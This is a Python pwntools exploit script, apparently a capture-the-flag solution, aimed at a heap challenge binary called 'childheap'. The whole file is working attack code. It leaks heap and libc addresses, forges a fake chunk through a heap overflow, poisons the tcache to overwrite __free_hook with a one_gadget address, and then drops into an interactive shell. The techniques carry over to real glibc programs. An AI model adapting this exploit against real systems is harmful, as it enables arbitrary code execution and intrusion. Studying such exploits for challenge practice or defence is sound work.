from pwn import *

p = process('childheap')
# p = remote('localhost', 7777)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadget = [0xe6c7e, 0xe6c81, 0xe6c84]

def alloc(size, s):
    p.sendlineafter('> ', '1')
    p.sendlineafter('Size: ', str(size))
    p.sendafter('Content: ', s)

def delete():
    p.sendlineafter('> ', '2')
    p.sendlineafter('[y/n] ', 'y')

def show():
    p.sendlineafter('> ', '2')
    p.recvuntil("Content: '")
    ret = p.recvuntil("'")[:-1]
    p.sendlineafter('[y/n] ', 'n')
    return ret

def wipe():
    p.sendlineafter('> ', '3')

def bof():
    alloc(0x18, 'A')
    delete()
    wipe()
    alloc(0x108, 'A')
    delete()
    wipe()
    alloc(0x18, b'A' * 0x18)
    wipe()
    alloc(0x108, 'A')
    delete()

# heap leak
alloc(0xf8, 'A')
delete()
wipe()
bof()
heap = u64(show().ljust(8, b'\x00'))
print(hex(heap + 0x840))
wipe()

# fill 0x100 tcache  
for i in range(5):
    bof()
    wipe()

# fakechunk
payload = b'A' * 0x18
payload += p64(0x51)
payload += p64(heap + 0x830) * 2

alloc(0x48, payload)
delete()
wipe()
alloc(0x18, 'A')
delete()
wipe()
alloc(0x108, 'A')
delete()
wipe()
alloc(0x28, 'A')
wipe()
alloc(0x18, b'A' * 0x10 + p64(0x50))
delete()
wipe()
alloc(0x108, b'A' * 0xf8 + p64(0x41))
delete()
wipe()

# libc leak
alloc(0x28, 'A')
delete()
wipe()
alloc(0, '')
libc.address = u64(show().ljust(8, b'\x00')) - 0x1ebbe0
print(hex(libc.address))
wipe()

# overwrite __free_hook
payload = b'A' * 0x18
payload += p64(0x101)
payload += p64(libc.symbols['__free_hook'])

alloc(0xf8, 'A')
wipe()
alloc(0x48, payload)
delete()
wipe()
alloc(0x28, 'A')
delete()
wipe()
alloc(0x48, payload)
delete()
wipe()
alloc(0xf8, 'A')
wipe()
alloc(0xf8, p64(libc.address + one_gadget[1]))
delete()

p.interactive()
